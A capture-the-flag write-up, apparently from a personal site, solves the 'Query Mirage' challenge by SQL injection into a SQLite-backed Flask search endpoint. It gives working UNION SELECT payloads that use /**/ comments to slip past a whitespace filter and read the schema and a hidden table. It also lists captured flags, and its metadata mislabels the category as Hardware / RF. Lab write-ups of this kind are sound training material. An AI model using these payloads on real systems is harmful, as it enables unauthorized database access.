---
title: "Query Mirage — SQL Injection Writeup"
description: "Host: 13.206.57.188 Solved instance: port 10026 Additional verified instance: port 10009 Framework: Flask/Werkzeug Root response: {\"message\":\"Query Mirage notes portal.\"}"
published: "2026-07-18"
updated: "2026-07-18"
event: "athenactf"
category: "Hardware / RF"
kind: "field-note"
status: "solved"
tags: ["Hardware / RF", "athenactf", "Field notes"]
readingTime: 1
wordCount: 158
featured: false
sourcePath: "~/ctf/athenactf/query_mirage/notes.md"
---

# Query Mirage — SQL Injection Writeup

## Target

- Host: `13.206.57.188`
- Solved instance: port `10026`
- Additional verified instance: port `10009`
- Framework: Flask/Werkzeug
- Root response: `{"message":"Query Mirage notes portal."}`

## Reconnaissance

The search interface is the root endpoint with a `q` query parameter:

```text
GET /?q=<term>
```

Normal searches return JSON records containing `title` and `body` fields. A single quote produces a SQLite error:

```json
{"error":"unrecognized token: \"' ORDER BY 1\""}
```

This confirms that the query is constructed unsafely and that the backend is SQLite.

## Filter bypass

The application blocks literal spaces, tabs, newlines, and `--` comments. SQLite block comments can replace whitespace, and an unterminated block comment can consume the remainder of the generated query.

Working proof-of-concept:

```text
q='/**/UNION/**/SELECT/**/'x','y'/*
```

The response includes an injected record with title `x` and body `y`, proving a two-column `UNION SELECT`.

## Schema discovery

The SQLite schema can be read through `sqlite_master`:

```text
q='/**/UNION/**/SELECT/**/name,sql/**/FROM/**/sqlite_master/*
```

This revealed:

```sql
CREATE TABLE notes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT NOT NULL,
    body TEXT NOT NULL
)

CREATE TABLE private_notes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT NOT NULL,
    body TEXT NOT NULL
)
```

## Flag extraction

Read the hidden table with:

```text
q='/**/UNION/**/SELECT/**/title,body/**/FROM/**/private_notes/*
```

The response returned an `admin memo` containing the flag.

## Flag

```text
athena{7c6p4yH4dkjKgjIq}
```

Port `10009` returned:

```text
athena{DPzAXNol0AcPQI2E}
```

## Reproduction

```bash
python3 solve.py http://13.206.57.188:10026
```

The reproducible solver is [solve.py](/Personal_Site/media/writeups/athenactf-query-mirage/solve.py).
